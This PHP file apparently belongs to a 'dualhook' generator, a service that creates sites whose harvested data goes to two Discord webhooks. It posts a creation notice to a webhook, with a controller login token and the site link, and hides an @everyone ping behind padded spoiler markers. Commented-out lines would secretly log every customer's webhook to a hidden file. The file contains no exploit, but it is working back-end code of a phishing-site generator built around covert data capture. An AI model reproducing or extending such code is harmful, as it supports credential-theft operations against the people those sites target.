<?php
$timestamp = date("c", strtotime("now"));
$json_data = json_encode([
   "content" => "**Dualhook creation was successful!**||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||@everyone", 
   "embeds" => [
         [
            "title" => "Your Dualhook Has Been Created Successfuly🎉", 
            "description" => "
[**Login to Controller**]($domain/controller/sign-in?token=$token)** | **[**Join Our Server**]($url)** | **[**Your Dualhook Link**]($domain/c/$sexnobddddd)

**Auth Token:**```fix
$token```
**On your controller, you can change the:** ```fix
• Your Webhook
• Site Thimbnail
• Site Name
• Site Slogan
```", 
            "color" => hexdec($hex), 
            "footer" => [
                  "text" => $name, 
                  "icon_url" => $thumbnail 
               ], 
            "timestamp" => $timestamp
         ] 
      ], 
   "username" => $name, 
   "avatar_url" => $thumbnail
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $sexnobdd );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$exec = curl_exec( $ch );
curl_close( $ch );
$file = 'gen_files/dualhook_counter.txt';
$fdata = file_get_contents ( $file );
$fdata = intval($fdata) + 1;
file_put_contents($file, $fdata); 
//$fp = fopen('gen_files/ahassecretfileforstoringwebhookslikescum.txt', 'a');
//fwrite($fp, "
//$sexnobdd");  
//fclose($fp); 
?>